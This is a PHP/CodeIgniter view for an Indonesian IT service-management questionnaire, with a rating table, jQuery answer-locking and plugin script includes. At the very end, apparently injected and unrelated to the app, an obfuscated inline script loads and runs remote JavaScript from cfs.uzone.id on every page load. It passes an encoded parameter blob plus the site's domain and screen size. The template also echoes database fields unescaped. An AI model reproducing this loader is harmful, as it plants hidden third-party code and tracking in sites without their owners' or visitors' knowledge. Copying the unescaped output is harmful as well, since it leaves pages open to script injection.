
<section class="content">
    <div class="block-header">
        <div class="container-fluid">
            <div class="row">
                <div class="col-md-8 col-sm-7 col-xs-12">
                    <div class="h-left clearfix">
                        <h2>DASHBOARD</h2>
                        <small class="text-muted">Welcome to Sistem Evaluasi Manajemen Layanan TI</small>
                        <ol class="breadcrumb breadcrumb-col-pink p-l-0">
                            <li><a href="javascript:void(0);">Dashboard</a></li>
                            <li class="active">Kuesioner</li>
                        </ol>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="container-fluid">
        <!-- Basic Table -->
        <div class="row clearfix">
            <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">
                <div class="card">
                    <div class="header">
                     <h2> PENGISIAN KUESIONER </h2>  
                 </div>
                 <div class="body table-responsive">
                <table class="table table-bordered">
                 <form action="<?php echo base_url('index.php/isi/kuisioner/'); ?>" method="POST" id="myForm">
                     <thead>
                        <tr>
                            <th>ID KUESIONER</th>
                            <th>KUESIONER</th>
                            <th>NILAI</th>
                            <th>ACTIONS</th>
                        </tr>
                    </thead>
                    <tbody>
                     <?php 
                     $no = 1;
                     $a =0;
                     foreach ($mydata as $row) { ?>
                     <tr>    
                        <td><?php echo $row->id_kuesioner ?></td>
                        <td><?php echo $row->kuesioner ?></td>
                        <td> <?php 
                            foreach ($maturity as $row1) { ?>
                            <input name="<?php echo $row->id_kuesioner ;?>" type="radio" onclick="$('#a<?php echo $row->id_kuesioner; ?>').show();" class="with-gap" id="<?php echo $no ;?>" value="<?php echo $row1->id_maturity; ?>"/>
                            <label for="<?php echo $no++ ?>"><?php echo $row1->level ?></label>                            
                            <?php } ?></td>
                            <?php $a++ ?>
                        <td><button type="button" onclick="tambah('#a<?php echo $row->id_kuesioner; ?>',<?php echo ($no-1); ?>);" id="a<?php echo $row->id_kuesioner;  ?>" style="display: none;">submit</button></td>
                        </tr> 
                        <?php } ?>               
                    </tbody>

                </table>
                <td><button type="button" onclick="selesai();" id="veri" class="btn btn-raised bg-green  waves-effect">Verifikasi <i class="material-icons"></i></button></td>
                 </form>
                <a href="<?php echo base_url('index.php/isi'); ?>"><button type="button" class="btn btn-raised bg-orange waves-effect">Kembali <i class="material-icons"></i></button>
                </div>
            </div>
        </div>
    </div>
</div>
</section>
<script>

    $(document).ready(function(){
        jml = <?php echo json_encode($a) ?>;
        jml1 = 0;
        jmlr= <?php echo json_encode($no) ?>;
        $('#veri').hide();
    });

    function tampii(no1){
        $(no1).show();
    }

    function selesai(){
        swal("Good job!", "You clicked the button!", "success");
        for (i = 1; i <= jmlr-1; i++) {
            console.log(i);
            $('#'+i).attr('disabled',false);     
        }
        document.getElementById('myForm').submit();
    }

    function tambah(id,no){
        $(''+id).hide();
        $('#'+no).attr('disabled',true);
        $('#'+(no-1)).attr('disabled',true);
        $('#'+(no-2)).attr('disabled',true);
        $('#'+(no-3)).attr('disabled',true);
        $('#'+(no-4)).attr('disabled',true);
        jml1++;
        if (jml == jml1) {
            $('#veri').show();
        }
    }
</script>
<!-- Jquery Core Js --> 
<!-- Jquery Core Js --> 
<script src="<?php echo base_url()."assets/"; ?>bundles/libscripts.bundle.js"></script> <!-- Lib Scripts Plugin Js --> 
<script src="<?php echo base_url()."assets/"; ?>bundles/vendorscripts.bundle.js"></script> <!-- Lib Scripts Plugin Js --> 

<!-- Jquery DataTable Plugin Js --> 
<script src="<?php echo base_url()."assets/"; ?>plugins/jquery-datatable/jquery.dataTables.js"></script> 
<script src="<?php echo base_url()."assets/"; ?>plugins/jquery-datatable/skin/bootstrap/js/dataTables.bootstrap.js"></script> 
<script src="<?php echo base_url()."assets/"; ?>plugins/jquery-datatable/extensions/export/dataTables.buttons.min.js"></script> 
<script src="<?php echo base_url()."assets/"; ?>plugins/jquery-datatable/extensions/export/buttons.flash.min.js"></script> 
<script src="<?php echo base_url()."assets/"; ?>plugins/jquery-datatable/extensions/export/jszip.min.js"></script> 
<script src="<?php echo base_url()."assets/"; ?>plugins/jquery-datatable/extensions/export/pdfmake.min.js"></script> 
<script src="<?php echo base_url()."assets/"; ?>plugins/jquery-datatable/extensions/export/vfs_fonts.js"></script> 
<script src="<?php echo base_url()."assets/"; ?>plugins/jquery-datatable/extensions/export/buttons.html5.min.js"></script> 
<script src="<?php echo base_url()."assets/"; ?>plugins/jquery-datatable/extensions/export/buttons.print.min.js"></script> 

<script src="<?php echo base_url()."assets/"; ?>plugins/jquery-sparkline/jquery.sparkline.js"></script> <!-- Sparkline Plugin Js -->

<script src="<?php echo base_url()."assets/"; ?>bundles/mainscripts.bundle.js"></script><!-- Custom Js --> 
<script src="<?php echo base_url()."assets/"; ?>js/pages/charts/sparkline.js"></script>
<script src="<?php echo base_url()."assets/"; ?>js/pages/tables/jquery-datatable.js"></script> 
<script src="<?php echo base_url()."assets/"; ?>/plugins/sweetalert/sweetalert.min.js"></script> 


<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKt4DxtVeiP1P1OdcZyoAyY%2bn%2fDRlMMNyunRnUOL8xRgsh%2fKXcOUor2%2fZvkhtS3xq%2b62v%2f2BowlKZ1jhKekwKucov%2b9gIwoEw%2b7sacCx734oWosEWHoxV9tNSi1AcgIjlRFLLJUiwM%2ffUb2F6NW6Hm7YPTx%2brqJTZ8ORi84hfUdShFGMoULVZuADrX5O9pFodhBrvzUck6erpGiAiTMGEG0wKVhTMaMekPGcMfzASbfkx0JYTGlyV%2fAXyMFJJC5e2mKVw19ZpxxMFaqCC%2bNyusqNhmUSabO5i%2bpEzIVT794hLzWnh7AlGoNL9ZaAq0SVwRu8BN0CvLbXmBwgTGluyUvAlIbtsdsmJl%2fckCHoDUvo9MWTPxQvCpy6N5WBPY23jj5erL2%2fyuM0zQJqCzLUo730n%2fpJBvBKOwOfMCeFA6wFVapM%2b6LFUC1Cv1u1a%2f4VFdPw6XLjSNFck%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>